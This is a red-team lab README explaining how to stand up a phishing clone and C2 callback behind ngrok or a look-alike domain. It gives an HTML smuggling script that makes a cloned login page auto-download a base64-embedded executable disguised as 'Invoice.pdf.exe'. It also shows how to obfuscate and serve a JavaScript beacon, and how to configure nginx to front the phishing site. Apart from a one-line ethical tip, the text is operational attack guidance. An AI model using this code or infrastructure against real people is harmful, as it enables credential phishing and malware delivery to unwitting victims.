
# 🔐 Red Team Lab: Payload Obfuscation + Ngrok + Custom Domain

## 🚀 Launch with Ngrok
1. Run the tunnel script:
   ```bash
   chmod +x start_with_ngrok.sh
   ./start_with_ngrok.sh
   ```

2. Copy the `https://xxxx.ngrok.io` URL — use it as your phishing or C2 callback address.

---

## 🧪 Add Payloads (JS or HTML Smuggling)

### HTML Smuggler Example
In your `phishing_clone/templates/login.html`, add:

```html
<script>
  let payload = atob("UEsDBBQAAAAIA...");  // base64 of EXE or ISO
  let blob = new Blob([payload], { type: 'application/octet-stream' });
  let a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = "Invoice.pdf.exe";
  a.click();
</script>
```

---

## 🔍 Obfuscate JavaScript Payload

Use `obfuscator.io` or:
```bash
npm install -g javascript-obfuscator
javascript-obfuscator beacon.js --output beacon.ob.js
```
Then serve `beacon.ob.js` from `/static/js/`.

---

## 🌐 Custom Domain (e.g., phishing.example.com)

1. Point your domain A record to your VPS IP.
2. Use a reverse proxy:
   - Install Nginx
   - Add config:
     ```
     server {
         listen 80;
         server_name phishing.example.com;
         location / {
             proxy_pass http://127.0.0.1:8000;
         }
     }
     ```
3. Restart nginx and test your domain.

✅ You now serve your Django-based phishing clone or C2 over a real-looking domain.

---

**Ethical Tip:** Only deploy in red team labs or simulations.
